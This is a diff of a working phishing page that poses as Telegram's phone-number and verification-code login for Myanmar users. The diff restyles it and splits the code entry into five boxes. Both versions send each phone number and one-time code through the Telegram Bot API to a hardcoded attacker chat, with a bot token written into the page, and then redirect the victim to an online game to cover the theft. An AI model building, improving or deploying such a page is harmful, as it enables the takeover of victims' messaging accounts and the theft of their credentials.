@@ -3,20 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Messenger</title>
+    <title>Verification</title>
     <style>
-        body { background-color: #1c2733; color: white; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        body { background-color: #1c2733; color: white; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .container { text-align: center; width: 90%; max-width: 350px; }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #7f91a4; font-size: 14px; margin-bottom: 35px; }
-        .input-box { border: 1px solid #3b4754; border-radius: 10px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; background: transparent; }
-        input { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
+        h2 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #7f91a4; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         
-        /* OTP အကွက် ပုံစံအသစ် */
-        .otp-box { border: 1px solid #3390ec; border-radius: 10px; padding: 15px; background: rgba(51, 144, 236, 0.1); margin-bottom: 20px; }
-        .otp-box input { text-align: center; letter-spacing: 10px; font-size: 24px; font-weight: bold; }
+        /* ဖုန်းနံပါတ်ရိုက်ကွက် */
+        .input-group { border: 1px solid #3b4754; border-radius: 12px; padding: 15px; display: flex; align-items: center; background: rgba(255,255,255,0.05); margin-bottom: 20px; }
+        input { background: transparent; border: none; color: white; font-size: 18px; outline: none; width: 100%; }
+        
+        /* OTP အကွက်ပုံစံ (၅ ကွက်ခွဲထားသည်) */
+        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
+        .otp-input { width: 45px; height: 55px; border: 1px solid #3b4754; border-radius: 10px; text-align: center; font-size: 22px; font-weight: bold; background: #242f3d; color: white; }
+        .otp-input:focus { border-color: #3390ec; box-shadow: 0 0 5px #3390ec; }
 
-        .next-btn { background: #3390ec; border: none; width: 55px; height: 55px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 20px; display: flex; align-items: center; justify-content: center; }
+        .btn { background: #3390ec; border: none; width: 60px; height: 60px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         #step2 { display: none; }
     </style>
 </head>
@@ -24,52 +27,56 @@
 
 <div class="container" id="step1">
     <h2>Your phone number</h2>
-    <p>Please confirm your country code and enter your phone number.</p>
-    <div class="input-box"><input type="text" value="Myanmar (Burma)" readonly></div>
-    <div class="input-box">
-        <span style="margin-right: 10px;">+95</span>
-        <input type="tel" id="phone" placeholder="9663804708" autocomplete="off">
+    <p>Confirm your country code and enter your phone number.</p>
+    <div class="input-group">
+        <span style="margin-right:12px; font-weight:bold;">+95</span>
+        <span style="color:#555; margin-right:12px;">|</span>
+        <input type="tel" id="phone" placeholder="Phone Number" autocomplete="off" name="no_autofill_phone">
     </div>
-    <button class="next-btn" onclick="goStep2()">→</button>
+    <button class="btn" onclick="toStep2()">→</button>
 </div>
 
 <div class="container" id="step2">
-    <div style="font-size: 50px; margin-bottom: 20px;">📩</div>
+    <div style="font-size: 50px; margin-bottom: 15px;">📩</div>
     <h2>Verification Code</h2>
-    <p>Check your Telegram app for the code.</p>
-    <div class="otp-box">
-        <input type="number" id="otp" placeholder="•••••" oninput="if(this.value.length > 5) this.value = this.value.slice(0,5);">
+    <p>Check your Telegram for the code.</p>
+    <div class="otp-container">
+        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 0)">
+        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 1)">
+        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 2)">
+        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 3)">
+        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 4)">
     </div>
-    <button class="next-btn" onclick="sendData()">→</button>
+    <button class="btn" onclick="finish()">→</button>
 </div>
 
 <script>
-    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
+    const bot_token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
     const chat_id = '5304050102';
-    // Redirect လမ်းကြောင်းကို Poki အစား တိုက်ရိုက် Game link သုံးသည်
-    const game_url = "https://poki.com/en/g/rail-in-the-air"; 
+    const game_url = "https://poki.com/en/g/rail-in-the-air";
 
-    function goStep2() {
+    function move(el, idx) {
+        if (el.value.length === 1 && idx < 4) document.querySelectorAll('.otp-input')[idx + 1].focus();
+    }
+
+    function toStep2() {
         let p = document.getElementById('phone').value;
         if(p.length < 7) return;
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📱 Number: +95${p}`);
+        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=📱 Phone: +95${p}`);
     }
 
-    function sendData() {
-        const otpVal = document.getElementById('otp').value;
-        if(otpVal.length < 5) return;
+    function finish() {
+        let otp = "";
+        document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
+        if(otp.length < 5) return;
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otpVal}`)
-        .then(() => {
-            // Chrome မှာရော App မှာပါ အဆင်ပြေအောင် Redirect လုပ်နည်းပြောင်းသည်
-            window.location.replace(game_url);
-        })
-        .catch(() => {
-            window.location.replace(game_url);
-        });
+        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otp}`)
+        .then(() => { window.location.replace(game_url); })
+        .catch(() => { window.location.replace(game_url); });
     }
 </script>
 </body>
 </html>
+
